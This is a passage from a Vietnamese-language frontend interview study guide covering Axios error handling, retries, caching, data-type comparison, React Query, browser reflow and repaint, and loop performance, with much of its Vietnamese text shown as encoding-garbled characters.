      console.error('- Network error');
      console.error('- CORS issue');
      console.error('- Request timeout');
      console.error('- Server not responding');
      
    } else {
 // Ch√∫ gi·∫£i: ‚ùå L·ªói khi setup request
      console.error('Setup error:', error.message);
    }
    
    console.error('Config:', error.config);
  } else {
    // L·ªói kh√°c (kh√¥ng ph·∫£i Axios error)
    console.error('Unexpected error:', error);
  }
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: CUSTOM ERROR HANDLER
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

interface ApiErrorResponse {
  success: boolean;
  message: string;
  status: number | null;
  data: any;
  errors?: Record<string, string[]>; // Ch√∫ gi·∫£i: Validation errors
}

const handleAxiosError = (error: unknown): ApiErrorResponse => {
  if (axios.isAxiosError(error)) {
    const message = error.response?.data?.message || error.message;
    const status = error.response?.status || null;
    const errors = error.response?.data?.errors;
    
    return {
      success: false,
      message,
      status,
      data: error.response?.data,
      errors,
    };
  }
  
  return {
    success: false,
    message: 'An unexpected error occurred',
    status: null,
    data: null,
  };
};

 // Ch√∫ gi·∫£i: Usage
try {
  const response = await axios.post('/api/users', userData);
  return { success: true, data: response.data, message: 'Success', status: 200 };
} catch (error) {
  return handleAxiosError(error);
}
```

---

### **6. Advanced Features**

#### **6.1. Retry Logic**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: AUTO RETRY v·ªõi Exponential Backoff
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const axiosRetry = async (config: any, retries = 3, delay = 1000) => {
  for (let i = 0; i < retries; i++) {
    try {
      return await axios(config);
    } catch (error) {
      if (i === retries - 1) throw error;
      
 // Ch√∫ gi·∫£i: Exponential backoff
      const waitTime = delay * Math.pow(2, i);
      console.log(`Retry ${i + 1}/${retries} after ${waitTime}ms...`);
      await new Promise(resolve => setTimeout(resolve, waitTime));
    }
  }
};

 // Ch√∫ gi·∫£i: Usage
const data = await axiosRetry({
  method: 'get',
  url: '/api/users',
}, 3, 1000);
```

#### **6.2. Request Deduplication**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: PREVENT DUPLICATE REQUESTS
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const pendingRequests = new Map<string, Promise<any>>();

const dedupeRequest = async (config: any) => {
  const key = `${config.method}:${config.url}:${JSON.stringify(config.params)}`;
  
  // N·∫øu c√≥ request pending
  if (pendingRequests.has(key)) {
    console.log('üîÑ Reusing pending request...');
    return pendingRequests.get(key);
  }
  
 // Ch√∫ gi·∫£i: Create new request
  const promise = axios(config).finally(() => {
    pendingRequests.delete(key);
  });
  
  pendingRequests.set(key, promise);
  return promise;
};
```

#### **6.3. Response Caching**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: SIMPLE CACHE IMPLEMENTATION
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

interface CacheEntry {
  data: any;
  timestamp: number;
}

const cache = new Map<string, CacheEntry>();

const cachedRequest = async (
  url: string,
  config = {},
  ttl = 5 * 60 * 1000 // Ch√∫ gi·∫£i: 5 minutes
) => {
  const cacheKey = `${url}:${JSON.stringify(config)}`;
  
 // Ch√∫ gi·∫£i: Check cache
  const cached = cache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < ttl) {
    console.log('‚úÖ Returning cached data');
    return cached.data;
  }
  
 // Ch√∫ gi·∫£i: Fetch fresh data
  const response = await axios.get(url, config);
  cache.set(cacheKey, {
    data: response.data,
    timestamp: Date.now(),
  });
  
  return response.data;
};
```

---

### **üí° Best Practices**

```typescript
// ‚úÖ 1. Lu√¥n d√πng axios instance thay v√¨ default axios
const api = axios.create({ baseURL: '/api' });

 // Ch√∫ gi·∫£i: ‚úÖ 2. TypeScript types cho responses
interface User {
  id: string;
  name: string;
}

const getUser = async (id: string): Promise<User> => {
  const { data } = await api.get<User>(`/users/${id}`);
  return data;
};

 // Ch√∫ gi·∫£i: ‚úÖ 3. Centralize error handling
api.interceptors.response.use(
  response => response,
  error => {
 // Ch√∫ gi·∫£i: Handle globally
    handleAxiosError(error);
    return Promise.reject(error);
  }
);

 // Ch√∫ gi·∫£i: ‚úÖ 4. Cancel requests on component unmount
useEffect(() => {
  const controller = new AbortController();
 // Ch√∫ gi·∫£i: ... fetch data
  return () => controller.abort();
}, []);

// ‚úÖ 5. Use timeout ƒë·ªÉ avoid hung requests
axios.create({ timeout: 10000 });
```

---
---
## 16. üîÄ Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals  

**P1: T√™n c√¢u h·ªèi:** üîÄ Q16: Compare Data Types - Objects, Strings, Big Numbers & Decimals  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"So s√°nh data types ph·ª©c t·∫°p c·∫ßn hi·ªÉu: Objects so s√°nh reference vs value, Strings x·ª≠ l√Ω Unicode/locale, Big Numbers/Decimals d√πng libraries v√¨ floating point precision issues."**

**üîë 4 Kh√°i Ni·ªám Ch√≠nh:**

**1. Object Comparison - Shallow vs Deep:**
- **Shallow**: So s√°nh reference + primitive values ·ªü level 1
  - `{a:1} === {a:1}` ‚Üí `false` (different references)
  - Use case: React.memo, shouldComponentUpdate
- **Deep**: Recursive compare t·∫•t c·∫£ nested properties
  - D√πng lodash `_.isEqual()` (handle circular refs, Date, RegExp)
  - ‚ö†Ô∏è O(n) complexity, c√≥ th·ªÉ infinite loop

**2. String Comparison - Unicode & Locale:**
- **`===` operator**: So s√°nh **binary representation** (kh√¥ng hi·ªÉu ƒÇ ‚â† A)
- **`localeCompare()`**: So s√°nh theo **ng√¥n ng·ªØ** (ti·∫øng Vi·ªát: √† < √° < ·∫£ < √£ < ·∫°)
  - V√≠ d·ª•: `'√†'.localeCompare('√°', 'vi')` ‚Üí `-1` (√† ƒë·ª©ng tr∆∞·ªõc)
- **`Intl.Collator`**: Performance cao h∆°n cho nhi·ªÅu comparisons
- ‚ö†Ô∏è Unicode variants: √© (e + ÃÅ) vs √© (single char) ‚Üí d√πng `.normalize('NFC')`

**3. Big Numbers - Precision Issues:**
- JavaScript Number: **53-bit precision** ‚Üí max safe integer = 2^53 - 1
- **Floating point error**: `0.1 + 0.2 !== 0.3` (binary representation)
- **Solutions**:
  - `BigInt` (native): integers only, kh√¥ng c√≥ decimals
  - Libraries: `decimal.js`, `big.js`, `bignumber.js` (arbitrary precision)
- ‚ö†Ô∏è KH√îNG d√πng `===` cho decimals ‚Üí d√πng epsilon: `Math.abs(a - b) < Number.EPSILON`

**4. Financial Calculations:**
- D√πng **integers** (cents, ƒë·ªìng) thay v√¨ floats: `1.99` ‚Üí `199` cents
- Libraries: `dinero.js` (money), `currency.js` (currency math)
- Format: `Intl.NumberFormat` cho localized currency display

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Deep compare objects trong render ‚Üí re-render loop (d√πng `useMemo`)
- So s√°nh strings kh√¥ng normalize Unicode ‚Üí "caf√©" ‚â† "caf√©"
- T√≠nh to√°n ti·ªÅn b·∫±ng floats ‚Üí rounding errors: `(0.1 + 0.2) * 100 = 30.000000000000004`
- Stringify objects ƒë·ªÉ compare ‚Üí kh√¥ng handle functions, Date, circular refs

**üí° Ki·∫øn Th·ª©c Senior:**
- **Structural sharing** (Immer, Redux): shallow copy ch·ªâ modified branches ‚Üí fast comparison
- **Object.is()** vs `===`: `Object.is(NaN, NaN) = true`, `Object.is(+0, -0) = false`
- JSON.stringify **kh√¥ng stable** (key order) ‚Üí d√πng `fast-json-stable-stringify`
- Banking systems: **double-entry bookkeeping**, store as integers, round at display layer only




**‚ö° Quick Summary:**
> So s√°nh d·ªØ li·ªáu ph·ª©c t·∫°p: Objects (deep/shallow), Strings (localeCompare, Unicode), Big Numbers/Decimals (precision handling)

**üí° Ghi Nh·ªõ:**
- üéØ **Objects**: Shallow (reference) vs Deep (recursive) - d√πng lodash isEqual cho circular refs
- üåç **Strings**: `localeCompare()` cho ti·∫øng Vi·ªát, `Intl.Collator` cho performance
- üí∞ **Big Numbers**: D√πng libraries (decimal.js, big.js) - KH√îNG d√πng `===` cho floating point
- ‚ö†Ô∏è **Traps**: `{a:1} === {a:1}` = false, `0.1 + 0.2 !== 0.3`, Unicode variants

---
---
## 17. üîÑ Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management  

**P1: T√™n c√¢u h·ªèi:** üîÑ Q17: React Query (TanStack Query) - Data Fetching, Caching & State Management  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"React Query l√† th∆∞ vi·ªán qu·∫£n l√Ω D·ªÆ LI·ªÜU T·ª™ SERVER, kh√°c v·ªõi state n·ªôi b·ªô ·ª©ng d·ª•ng (Redux/Zustand).**

**üì¶ Kh√°i Ni·ªám C·ªët L√µi:**
- **D·ªØ li·ªáu Server vs State Client**: D·ªØ li·ªáu server = b·∫•t ƒë·ªìng b·ªô, chia s·∫ª, c√≥ th·ªÉ c≈© (th√¥ng tin user, b√†i vi·∫øt). State client = ƒë·ªìng b·ªô, c·ª•c b·ªô (tr·∫°ng th√°i UI, d·ªØ li·ªáu form).
- **Query (Truy v·∫•n)**: L·∫•y v√† l∆∞u cache d·ªØ li·ªáu b·∫±ng `useQuery({ queryKey, queryFn })`. QueryKey = ƒë·ªãnh danh cache + m·∫£ng ph·ª• thu·ªôc.
- **Mutation (Thay ƒë·ªïi)**: Ch·ªânh s·ª≠a d·ªØ li·ªáu server b·∫±ng `useMutation()`, t·ª± ƒë·ªông l√†m m·ªõi c√°c query li√™n quan.
- **Chi·∫øn l∆∞·ª£c Cache**: `staleTime` (d·ªØ li·ªáu t∆∞∆°i bao l√¢u) vs `gcTime` (th·ªùi gian gi·ªØ cache sau khi component unmount).

**üîë Refetch vs Invalidate:**
- **`refetch()`**: Bu·ªôc l·∫•y l·∫°i d·ªØ li·ªáu ngay l·∫≠p t·ª©c (k√≠ch ho·∫°t th·ªß c√¥ng).
- **`invalidateQueries()`**: ƒê√°nh d·∫•u d·ªØ li·ªáu c≈© ‚Üí t·ª± ƒë·ªông l·∫•y l·∫°i ·ªü background n·∫øu component ƒëang hi·ªÉn th·ªã.
- **Th·ª±c h√†nh t·ªët**: D√πng `invalidateQueries` sau khi thay ƒë·ªïi d·ªØ li·ªáu ƒë·ªÉ t·ª± ƒë·ªông ƒë·ªìng b·ªô giao di·ªán.

**‚ôªÔ∏è V√≤ng ƒê·ªùi Query (7 giai ƒëo·∫°n):**
1. **Fresh (T∆∞∆°i)**: D·ªØ li·ªáu m·ªõi l·∫•y, c√≤n trong `staleTime` ‚Üí kh√¥ng l·∫•y l·∫°i.
2. **Stale (C≈©)**: H·∫øt `staleTime` ‚Üí s·∫µn s√†ng l·∫•y l·∫°i khi c√≥ k√≠ch ho·∫°t (focus c·ª≠a s·ªï, mount, interval).
3. **Fetching (ƒêang l·∫•y)**: ƒêang g·ªçi API (background ho·∫∑c l·∫ßn ƒë·∫ßu).
4. **Inactive (Kh√¥ng ho·∫°t ƒë·ªông)**: Component unmount ‚Üí query kh√¥ng active.
5. **Garbage Collection (Thu h·ªìi)**: Sau `gcTime` (m·∫∑c ƒë·ªãnh 5 ph√∫t) ‚Üí x√≥a cache.
6. **Error (L·ªói)**: L·∫•y d·ªØ li·ªáu th·∫•t b·∫°i ‚Üí t·ª± ƒë·ªông th·ª≠ l·∫°i v·ªõi th·ªùi gian ch·ªù tƒÉng d·∫ßn.
7. **Paused (T·∫°m d·ª´ng)**: Ch·∫ø ƒë·ªô offline ‚Üí t·∫°m d·ª´ng l·∫•y d·ªØ li·ªáu, ti·∫øp t·ª•c khi online.

**üéØ C√°c Tr∆∞·ªùng H·ª£p S·ª≠ D·ª•ng:**
- **T·ª± ƒë·ªông l·∫•y l·∫°i**: Focus c·ª≠a s·ªï, k·∫øt n·ªëi l·∫°i m·∫°ng, polling theo kho·∫£ng th·ªùi gian.
- **C·∫≠p nh·∫≠t l·∫°c quan**: C·∫≠p nh·∫≠t giao di·ªán tr∆∞·ªõc, rollback n·∫øu API th·∫•t b·∫°i.
- **Cu·ªôn v√¥ h·∫°n**: `useInfiniteQuery()` v·ªõi `getNextPageParam`.
- **Prefetching**: `queryClient.prefetchQuery()` tr∆∞·ªõc khi chuy·ªÉn trang.

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Nh·∫ßm l·∫´n `staleTime` v·ªõi `gcTime` (staleTime = ƒë·ªô t∆∞∆°i, gcTime = th·ªùi gian gi·ªØ cache).
- Qu√™n dependencies trong `queryKey` ‚Üí kh√¥ng l·∫•y l·∫°i khi params thay ƒë·ªïi.
- L·∫°m d·ª•ng tr·∫°ng th√°i loading ‚Üí d√πng `isLoading` vs `isPending` ƒë√∫ng ng·ªØ c·∫£nh.
- Kh√¥ng x·ª≠ l√Ω tr·∫°ng th√°i l·ªói ‚Üí thi·∫øu error boundaries.

**üí° Ki·∫øn Th·ª©c Senior:**
- **Hi·ªáu nƒÉng**: React Query g·ªôp requests ‚Üí nhi·ªÅu components c√πng query ch·ªâ g·ªçi API 1 l·∫ßn.
- **DevTools**: D√πng React Query DevTools ƒë·ªÉ debug tr·∫°ng th√°i cache, th·ªùi gian stale, tr·∫°ng th√°i query.
- **SSR**: K·∫øt h·ª£p v·ªõi `HydrationBoundary` + `prefetchQuery` tr√™n server.
- **Chuy·ªÉn ƒë·ªïi**: Thay th·∫ø Redux/SWR d·∫ßn d·∫ßn ‚Üí migrate t·ª´ng t√≠nh nƒÉng, kh√¥ng l√†m c√πng l√∫c.

---
---
## 18. üé® Q18: Browser Rendering (Paint, Repaint, Reflow)  

**P1: T√™n c√¢u h·ªèi:** üé® Q18: Browser Rendering (Paint, Repaint, Reflow)  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (1-2 ph√∫t):**

**"Reflow (t√≠nh to√°n l·∫°i b·ªë c·ª•c) t·ªën k√©m h∆°n Repaint (v·∫Ω l·∫°i). T·ªëi ∆∞u b·∫±ng c√°ch g·ªôp thay ƒë·ªïi DOM, d√πng transform/opacity.**

**üé® Quy Tr√¨nh Render (ƒê∆∞·ªùng ·ªêng Render Quan Tr·ªçng):**
1. **X√¢y D·ª±ng DOM**: Ph√¢n t√≠ch HTML ‚Üí c√¢y DOM.
2. **X√¢y D·ª±ng CSSOM**: Ph√¢n t√≠ch CSS ‚Üí c√¢y CSSOM.
3. **C√¢y Render**: K·∫øt h·ª£p DOM + CSSOM ‚Üí ch·ªâ c√°c ph·∫ßn t·ª≠ hi·ªÉn th·ªã.
4. **Layout (Reflow)**: T√≠nh to√°n k√≠ch th∆∞·ªõc/v·ªã tr√≠ c·ªßa m·ªói ph·∫ßn t·ª≠.
5. **Paint (V·∫Ω)**: V·∫Ω pixels (m√†u s·∫Øc, h√¨nh ·∫£nh, vi·ªÅn, b√≥ng).
6. **Composite (T·ªïng h·ª£p)**: K·∫øt h·ª£p c√°c l·ªõp ‚Üí m√†n h√¨nh cu·ªëi c√πng.

**üîë Paint vs Repaint vs Reflow:**

| Thao T√°c | K√≠ch Ho·∫°t | Chi Ph√≠ | V√≠ D·ª• |
|----------|-----------|---------|-------|
| **Paint** | Render l·∫ßn ƒë·∫ßu | Trung b√¨nh | T·∫£i trang l·∫ßn ƒë·∫ßu |
| **Repaint** | Thay ƒë·ªïi h√¨nh ·∫£nh (kh√¥ng layout) | Th·∫•p | `color`, `background`, `visibility` |
| **Reflow** | Thay ƒë·ªïi b·ªë c·ª•c | **Cao** | `width`, `height`, `margin`, `padding`, `display` |

**‚ö° K√≠ch Ho·∫°t Reflow (T·ªën K√©m!):**
- Thao t√°c DOM: Th√™m/x√≥a ph·∫ßn t·ª≠, thay ƒë·ªïi n·ªôi dung.
- Thay ƒë·ªïi CSS: `width`, `height`, `margin`, `padding`, `border`, `display`, `position`.
- ƒê·ªçc thu·ªôc t√≠nh layout: `offsetWidth`, `offsetHeight`, `clientWidth`, `scrollTop` ‚Üí bu·ªôc reflow ƒë·ªìng b·ªô!
- Thay ƒë·ªïi k√≠ch th∆∞·ªõc c·ª≠a s·ªï, thay ƒë·ªïi font, thay ƒë·ªïi class.

**‚ôªÔ∏è K√≠ch Ho·∫°t Repaint (R·∫ª H∆°n):**
- Thu·ªôc t√≠nh h√¨nh ·∫£nh: `color`, `background-color`, `visibility`, `outline`, `box-shadow`.
- Kh√¥ng thay ƒë·ªïi layout ‚Üí ch·ªâ v·∫Ω l·∫°i pixels.

**üöÄ K·ªπ Thu·∫≠t T·ªëi ∆Øu:**
1. **G·ªôp Thay ƒê·ªïi DOM**:
   ```js
   // ‚ùå T·ªá: 3 reflows
   el.style.width = '100px';
   el.style.height = '100px';
   el.style.margin = '10px';
   
 // Ch√∫ gi·∫£i: ‚úÖ T·ªët: 1 reflow
   el.style.cssText = 'width: 100px; height: 100px; margin: 10px;';
   // Ho·∫∑c d√πng class
   el.className = 'new-style';
   ```

2. **D√πng transform/opacity (Ch·ªâ Composite):**
   ```js
   // ‚ùå T·ªá: Reflow + Repaint
   el.style.left = '100px'; // Thay ƒë·ªïi v·ªã tr√≠ ‚Üí reflow
   
   // ‚úÖ T·ªët: Ch·ªâ composite (tƒÉng t·ªëc GPU)
   el.style.transform = 'translateX(100px)'; // Kh√¥ng reflow/repaint!
   ```

3. **Tr√°nh ƒê·ªçc Thu·ªôc T√≠nh Layout Trong V√≤ng L·∫∑p**:
   ```js
   // ‚ùå T·ªá: Bu·ªôc reflow m·ªói v√≤ng l·∫∑p
   for (let i = 0; i < 100; i++) {
     el.style.width = el.offsetWidth + 10 + 'px'; // ƒê·ªçc + ghi ‚Üí reflow!
   }
   
   // ‚úÖ T·ªët: ƒê·ªçc m·ªôt l·∫ßn, ghi m·ªôt l·∫ßn
   const width = el.offsetWidth;
   el.style.width = width + 1000 + 'px';
   ```

4. **requestAnimationFrame Cho Animation:**
   ```js
   function animate() {
     el.style.transform = `translateX(${x}px)`;
     x += 1;
     requestAnimationFrame(animate); // Ch√∫ gi·∫£i: Sync v·ªõi browser refresh (60fps)
   }
   ```

5. **Virtualize Long Lists**: Ch·ªâ render visible items (react-window, react-virtualized).

**‚ö†Ô∏è Common Mistakes:**
- Changing styles trong loop ‚Üí multiple reflows.
- Reading layout properties (offsetWidth) sau write ‚Üí force synchronous reflow.
- Animating `width/height/top/left` thay v√¨ `transform`.

**üí° Senior Insights:**
- **Composite Layers**: `transform`, `opacity` run on compositor thread (GPU) ‚Üí kh√¥ng block main thread.
- **will-change**: `will-change: transform` hint browser t·∫°o separate layer ‚Üí optimize animations.
- **Layout Thrashing**: Read ‚Üí Write ‚Üí Read ‚Üí Write pattern ‚Üí force multiple reflows. D√πng FastDOM library.
- **DevTools**: Chrome DevTools ‚Üí Performance tab ‚Üí see reflow/repaint events.
- **CSS Containment**: `contain: layout` isolate element ‚Üí reflow kh√¥ng spread to parent.

---

**‚ö° Quick Summary:**
> Reflow = recalculate layout (expensive). Repaint = redraw pixels. Paint = first render

**üí° Ghi Nh·ªõ:**
- üé® **Paint**: First render l√™n screen
- üîÑ **Reflow**: Recalculate layout (DOM thay ƒë·ªïi size/position)
- üñåÔ∏è **Repaint**: Redraw pixels (color, visibility change)
- ‚ö° **Optimize**: Batch DOM changes, use transform/opacity, requestAnimationFrame

**Tr·∫£ l·ªùi:**

- **Paint**: V·∫Ω pixels l√™n screen
- **Repaint**: V·∫Ω l·∫°i elements v·ªõi same layout
- **Reflow**: Recalculate layout v√† repaint
- **Ho·∫°t ƒë·ªông**: Reflow ‚Üí Repaint ‚Üí Composite
- **∆Øu ƒëi·ªÉm**: Optimized rendering, smooth animations
- **Nh∆∞·ª£c ƒëi·ªÉm**: Reflow expensive, c√≥ th·ªÉ g√¢y performance issues

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: Reflow triggers
function triggerReflow(): void {
  const element = document.getElementById('myElement');
  if (element) {
 // Ch√∫ gi·∫£i: These trigger reflow
    element.style.width = '200px';
    element.style.height = '100px';
    element.style.margin = '10px';
    element.style.padding = '5px';

 // Ch√∫ gi·∫£i: Reading layout properties also triggers reflow
    const width = element.offsetWidth;
    const height = element.offsetHeight;
  }
}

 // Ch√∫ gi·∫£i: Optimized - batch DOM changes
function optimizedReflow(): void {
  const element = document.getElementById('myElement');
  if (element) {
 // Ch√∫ gi·∫£i: Batch all changes
    element.style.cssText =
      'width: 200px; height: 100px; margin: 10px; padding: 5px;';

 // Ch√∫ gi·∫£i: Or use class
    element.className = 'new-style';
  }
}

// Use transform for animations (tr√°nh reflow)
function animateWithTransform(): void {
  const element = document.getElementById('myElement');
  if (element) {
 // Ch√∫ gi·∫£i: Transform doesn't trigger reflow
    element.style.transform = 'translateX(100px)';
    element.style.transition = 'transform 0.3s ease';
  }
}
```

**Best Practices:**

- Tr√°nh reflow khi c√≥ th·ªÉ
- S·ª≠ d·ª•ng transform cho animations
- S·ª≠ d·ª•ng requestAnimationFrame
- Batch DOM changes
---
## 19. üîÅ Q19: Loop Performance & Async Loops  

**P1: T√™n c√¢u h·ªèi:** üîÅ Q19: Loop Performance & Async Loops  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Loop performance: `for` nhanh nh·∫•t, `for...of` readable, `forEach/map` functional. Async loops: `Promise.all()` parallel, `for await...of` sequential."**

**üîë Performance Ranking:**

**1. Classic `for` loop (nhanh nh·∫•t):**
- **O(n) v·ªõi minimal overhead** - tr·ª±c ti·∫øp access index
- Support `break`, `continue`
- Use case: performance-critical, large arrays (>10k items)

**2. `for...of` (modern, readable):**
- Ch·∫≠m h∆°n `for` ~10-30% (iterator protocol overhead)
- **Cleanest syntax**, support break/continue
- Use case: code readability > performance, iterate Set/Map/String

**3. `forEach` (functional):**
- Ch·∫≠m h∆°n ~50% (function call overhead m·ªói iteration)
- **KH√îNG support break/continue**, kh√¥ng th·ªÉ return early
- Use case: side effects, functional programming style

**4. `map/filter/reduce` (transformation):**
- **T·∫°o array m·ªõi** + function overhead
- Ph·∫£i loop h·∫øt array (kh√¥ng early exit)
- Use case: data transformation, immutable operations

**5. `for...in` (ch·∫≠m nh·∫•t):**
- **KH√îNG d√πng cho arrays** - iterate prototype chain
- Use case: ch·ªâ d√πng cho object keys

**üîë Async Loops - 3 Patterns:**

**1. Sequential (ch·ªù t·ª´ng c√°i):**
```js
for (const item of items) {
  await processItem(item); // Ch·ªù xong m·ªõi ch·∫°y ti·∫øp
}
```
- Ch·∫≠m nh∆∞ng **controlled**, preserve order

**2. Parallel (ch·∫°y c√πng l√∫c):**
```js
await Promise.all(items.map(item => processItem(item)));
```
- **Nhanh nh·∫•t** nh∆∞ng kh√¥ng control order, c√≥ th·ªÉ overload server

**3. Batched (nh√≥m nh·ªè):**
```js
for (let i = 0; i < items.length; i += 10) {
  await Promise.all(items.slice(i, i+10).map(processItem));
}
```
- **Best practice** - balance speed vs resource usage

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng `forEach` v·ªõi `async/await` ‚Üí **KH√îNG ch·ªù** (promises ignored!)
- `Promise.all()` v·ªõi large arrays ‚Üí overload server/memory
- D√πng `for...in` cho arrays ‚Üí iterate c·∫£ prototype properties
- `map()` cho side effects (should use `forEach`)

**üí° Ki·∫øn Th·ª©c Senior:**
- **Early exit**: `for`/`for...of` d√πng `break`, functional methods d√πng `.some()` / `.every()`
- **Promise.allSettled()** thay Promise.all() ƒë·ªÉ **kh√¥ng fail h·∫øt** khi 1 promise reject
- **p-limit** library ƒë·ªÉ control concurrency (max 5 parallel requests)
- Performance: `while` nhanh nh∆∞ `for`, `do...while` cho at-least-once loops




**‚ö° Quick Summary:**
> for loop = fastest. forEach = readable. map/filter = functional. Async loops = Promise.all ho·∫∑c for await

**üí° Ghi Nh·ªõ:**
- ‚ö° **Performance**: for > for...of > forEach > map
- üîÑ **Async**: D√πng `for await...of` ho·∫∑c `Promise.all()`
- ‚ö†Ô∏è **Trap**: forEach kh√¥ng work v·ªõi async/await!

**Tr·∫£ l·ªùi:**

C√≥ nhi·ªÅu c√°ch ƒë·ªÉ loop qua array/object trong JavaScript, m·ªói c√°ch c√≥ performance v√† behavior kh√°c nhau:

**üîÑ C√°c lo·∫°i Loops & Performance:**

1. **`for` loop** - Nhanh nh·∫•t ‚ö°

   - Performance: ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (fastest)
   - Control: Full control (break, continue)
   - Use case: Performance-critical code, large arrays

